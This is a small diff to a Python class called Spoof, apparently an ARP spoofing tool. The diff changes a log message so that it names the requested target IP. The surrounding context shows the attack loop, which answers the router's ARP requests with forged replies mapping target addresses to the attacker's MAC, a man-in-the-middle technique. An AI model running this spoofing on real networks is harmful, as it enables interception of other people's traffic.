@@ -72,7 +72,7 @@ class Spoof:
                     sleep(0.5)
 
             if pkt.psrc == self.routerip and pkt.pdst in self.targets:
-                print(self.routerip, "is asking for", self.targetip, ", sending spoofed replies...")
+                print(self.routerip, "is asking for", pkt.pdst, ", sending spoofed replies...")
                 for x in range(5):
                     self.spoof(self.routerip,self.routermac,pkt.pdst,self.mymac)
                     sleep(0.5)
